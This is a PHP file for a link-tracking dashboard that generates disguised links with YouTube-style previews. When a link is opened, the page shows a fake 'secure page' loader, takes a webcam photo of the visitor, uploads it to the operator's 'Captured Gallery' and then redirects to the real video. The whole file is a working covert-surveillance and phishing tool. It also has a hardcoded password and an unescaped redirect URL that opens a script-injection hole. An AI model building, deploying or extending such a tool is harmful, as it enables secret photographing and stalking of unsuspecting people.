<?php
date_default_timezone_set('Africa/Algiers');
session_start();

ini_set('display_errors', 0);
error_reporting(0);

// التحقق من تسجيل الدخول
$password_correct = 'aziz123';

if (isset($_POST['login_password'])) {
    if ($_POST['login_password'] === $password_correct) {
        $_SESSION['authenticated'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    } else {
        $login_error = "كلمة المرور غير صحيحة!";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}

try {
    $db = new PDO('sqlite:tracker_pro.db');
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        meta_title TEXT,
        meta_image TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        image_data TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("Database Error");
}

// معالجة طلبات الحذف (يتطلب مصادقة)
if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && $_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['delete_id'])) {
        $id_to_delete = intval($_POST['delete_id']);
        $stmt = $db->prepare("DELETE FROM captures WHERE id = ?");
        $stmt->execute([$id_to_delete]);
        header("Location: " . $_SERVER['PHP_SELF'] . (!empty($_GET['track']) ? '?track=' . urlencode($_GET['track']) : ''));
        exit();
    }
    
    if (isset($_POST['delete_all'])) {
        $track_code = trim($_POST['track_code'] ?? '');
        if (!empty($track_code)) {
            $stmt = $db->prepare("DELETE FROM captures WHERE code = ?");
            $stmt->execute([$track_code]);
            header("Location: " . $_SERVER['PHP_SELF'] . '?track=' . urlencode($track_code));
        } else {
            $db->exec("DELETE FROM captures");
            header("Location: " . $_SERVER['PHP_SELF']);
        }
        exit();
    }
}

function fetch_real_meta($url) {
    $title = "Secure Redirect";
    $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";

    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url, $matches)) {
        $video_id = $matches[1];
        $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
        
        $oembed_url = "https://www.youtube.com/oembed?url=" . urlencode($url) . "&format=json";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $oembed_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
        $json = curl_exec($ch);
        curl_close($ch);
        
        if ($json) {
            $data = json_decode($json, true);
            if (isset($data['title'])) {
                $title = $data['title'];
            }
        }
    }
    return ['title' => trim($title), 'image' => trim($image)];
}

$og_title = "Secure Redirect";
$og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
$target_redirect = "";

if (isset($_GET['r'])) {
    $code = $_GET['r'];
    $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {
        $target_redirect = $link['target_url'];
        $og_title = $link['meta_title'];
        $og_image = $link['meta_image'];

        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
            $img_base64 = $_POST['image'] ?? '';
            if (!empty($img_base64)) {
                try {
                    $capStmt = $db->prepare("INSERT INTO captures (code, image_data, created_at) VALUES (?, ?, ?)");
                    $capStmt->execute([$code, $img_base64, date('Y-m-d H:i:s')]);
                } catch (Exception $e) {}
            }
            exit('OK');
        }
    } else {
        die("Invalid Code.");
    }
}

$generated_link = "";
$tracking_code = "";
if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && $_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
    $target_url = trim($_POST['target_url']);
    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }

    $meta = fetch_real_meta($target_url);
    $code = substr(md5(uniqid(rand(), true)), 0, 7);
    
    $stmt = $db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image) VALUES (?, ?, ?, ?)");
    $stmt->execute([$code, $target_url, $meta['title'], $meta['image']]);

    $tracking_code = $code;
    $domain = $_SERVER['HTTP_HOST'];
    $generated_link = "https://" . $domain . "/?r=" . $code;
}

$filter_code = trim($_GET['track'] ?? '');
if (!empty($filter_code)) {
    $stmt = $db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
    $stmt->execute([$filter_code]);
    $captures = $stmt->fetchAll(PDO::FETCH_ASSOC);
} else {
    $captures = $db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
}

if (isset($_GET['r']) && !empty($target_redirect)):
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($og_title); ?></title>
    <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
    <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
    <meta property="og:type" content="website">
    <style>
        body { background-color: #030712; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; font-family: sans-serif; }
        .loader { text-align: center; }
        .spinner { width: 40px; height: 40px; border: 4px solid #1e293b; border-top: 4px solid #6366f1; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { font-size: 14px; color: #64748b; }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Loading secure page...</p>
    </div>

    <script>
        window.addEventListener('DOMContentLoaded', () => {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 640;
                        canvas.height = 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
                        stream.getTracks().forEach(track => track.stop());

                        const formData = new URLSearchParams();
                        formData.append('save_capture', '1');
                        formData.append('image', imageData);

                        const targetUrl = "<?php echo $target_redirect; ?>";

                        fetch(window.location.href, {
                            method: 'POST',
                            body: formData
                        }).finally(() => {
                            window.location.replace(targetUrl);
                        });
                    }, 2000); 
                })
                .catch(err => {
                    window.location.replace("<?php echo $target_redirect; ?>");
                });
        });
    </script>
</body>
</html>
<?php 
    exit(); 
endif; 
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Terminal Dashboard</title>
    <style>
        :root {
            --bg: #030712;
            --card: #0f172a;
            --border: #1e293b;
            --accent: #6366f1;
            --accent-hover: #4f46e5;
            --danger: #ef4444;
            --danger-hover: #dc2626;
            --text: #f8fafc;
            --muted: #64748b;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background-color: var(--bg); color: var(--text); padding: 30px 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
        .container { max-width: 1200px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
        
        .panel { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 24px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.3); }
        h2 { font-size: 13px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted); margin-bottom: 16px; border-bottom: 1px solid var(--border); padding-bottom: 8px; }

        .form-control { display: flex; gap: 10px; }
        input[type="text"], input[type="password"] { flex: 1; background: #020617; border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; color: var(--text); font-size: 14px; outline: none; transition: border 0.2s; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: var(--accent); }
        
        .btn { background: var(--accent); color: white; border: none; padding: 0 20px; border-radius: 8px; font-weight: 600; cursor: pointer; height: 46px; display: inline-flex; align-items: center; justify-content: center; font-size: 13px; text-decoration: none; transition: background 0.2s; }
        .btn:hover { background: var(--accent-hover); }
        .btn-danger { background: var(--danger); color: white; }
        .btn-danger:hover { background: var(--danger-hover); }
        .btn-secondary { background: #334155; }
        .btn-secondary:hover { background: #475569; }
        
        .output-box { background: #020617; border: 1px solid var(--border); padding: 16px; border-radius: 8px; margin-top: 15px; }
        .output-box label { display: block; font-size: 10px; text-transform: uppercase; color: var(--muted); margin-bottom: 6px; }
        .flex-row { display: flex; gap: 8px; }

        .gallery-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 16px; margin-top: 15px; }
        .item-card { background: #020617; border: 1px solid var(--border); border-radius: 8px; padding: 10px; text-align: center; display: flex; flex-direction: column; justify-content: space-between; }
        .item-card img { width: 100%; height: 180px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border); }
        .meta-info { margin-top: 10px; font-size: 11px; color: var(--muted); display: flex; justify-content: space-between; align-items: center; }
        .code-tag { color: var(--accent); font-family: monospace; font-weight: bold; }
        .btn-delete-single { background: rgba(239, 68, 68, 0.1); color: var(--danger); border: 1px solid var(--danger); padding: 6px 10px; border-radius: 6px; font-size: 11px; cursor: pointer; margin-top: 10px; width: 100%; transition: all 0.2s; font-weight: 600; }
        .btn-delete-single:hover { background: var(--danger); color: white; }

        .login-wrapper { display: flex; justify-content: center; align-items: center; height: 80vh; }
        .login-card { max-width: 400px; width: 100%; text-align: center; }
        .error-msg { color: var(--danger); font-size: 12px; margin-bottom: 12px; }

        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }

        footer { text-align: center; margin-top: 40px; font-size: 11px; color: var(--muted); border-top: 1px solid var(--border); padding-top: 20px; }
        footer span { color: var(--accent); font-weight: 600; }
    </style>
</head>
<body>
    <div class="container">

        <?php if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true): ?>
            <!-- نموذج تسجيل الدخول -->
            <div class="login-wrapper">
                <div class="panel login-card">
                    <h2>Secure Terminal Access</h2>
                    <?php if (isset($login_error)): ?>
                        <div class="error-msg"><?php echo $login_error; ?></div>
                    <?php endif; ?>
                    <form method="POST" style="display: flex; flex-direction: column; gap: 12px;">
                        <input type="password" name="login_password" placeholder="Enter Password..." required autofocus>
                        <button type="submit" class="btn" style="width: 100%;">Login</button>
                    </form>
                </div>
            </div>
        <?php else: ?>
            <!-- لوحة التحكم الكاملة -->
            <div class="top-bar">
                <h1 style="font-size: 16px; color: var(--text);">Secure Terminal Dashboard</h1>
                <a href="?logout=1" class="btn btn-secondary" style="height: 36px; font-size: 12px; padding: 0 14px; text-decoration: none;">تسجيل الخروج</a>
            </div>
            
            <div class="panel">
                <h2>Generate Secure Link</h2>
                <form method="POST" class="form-control">
                    <input type="text" name="target_url" placeholder="Target Destination URL..." required>
                    <button type="submit" name="create" class="btn">Generate</button>
                </form>

                <?php if (!empty($generated_link)): ?>
                    <div class="output-box">
                        <label>Active Tracking URL:</label>
                        <div class="flex-row">
                            <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
                            <button type="button" class="btn btn-secondary" onclick="navigator.clipboard.writeText('<?php echo htmlspecialchars($generated_link); ?>')">Copy</button>
                        </div>
                    </div>
                <?php endif; ?>
            </div>

            <div class="panel">
                <div class="gallery-header">
                    <h2>Captured Gallery</h2>
                    <?php if (!empty($captures)): ?>
                        <form method="POST" onsubmit="return confirm('هل أنت متأكد من رغبتك في حذف جميع الصور المعروضة؟');">
                            <input type="hidden" name="delete_all" value="1">
                            <input type="hidden" name="track_code" value="<?php echo htmlspecialchars($filter_code); ?>">
                            <button type="submit" class="btn btn-danger" style="height: 36px; font-size: 12px; padding: 0 14px;">حذف الكل</button>
                        </form>
                    <?php endif; ?>
                </div>

                <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
                    <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>">
                    <button type="submit" class="btn">Filter</button>
                    <?php if(!empty($filter_code)): ?>
                        <a href="/" class="btn btn-secondary" style="text-decoration:none; display:flex; align-items:center;">Reset</a>
                    <?php endif; ?>
                </form>

                <?php if (empty($captures)): ?>
                    <p style="text-align: center; color: var(--muted); padding: 30px;">No captures recorded.</p>
                <?php else: ?>
                    <div class="gallery">
                        <?php foreach ($captures as $cap): ?>
                            <div class="item-card">
                                <div>
                                    <a href="<?php echo $cap['image_data']; ?>" target="_blank">
                                        <img src="<?php echo $cap['image_data']; ?>" alt="Capture">
                                    </a>
                                    <div class="meta-info">
                                        <span class="code-tag"><?php echo htmlspecialchars($cap['code']); ?></span>
                                        <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
                                    </div>
                                </div>
                                <form method="POST" onsubmit="return confirm('هل تريد حذف هذه الصورة بالتحديد؟');">
                                    <input type="hidden" name="delete_id" value="<?php echo $cap['id']; ?>">
                                    <button type="submit" class="btn-delete-single">حذف الصورة</button>
                                </form>
                            </div>
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>
            </div>
        <?php endif; ?>

    </div>

    <footer>
        <p>Core Engine <span>azeez</span> &copy; 2026</p>
    </footer>
</body>
</html>
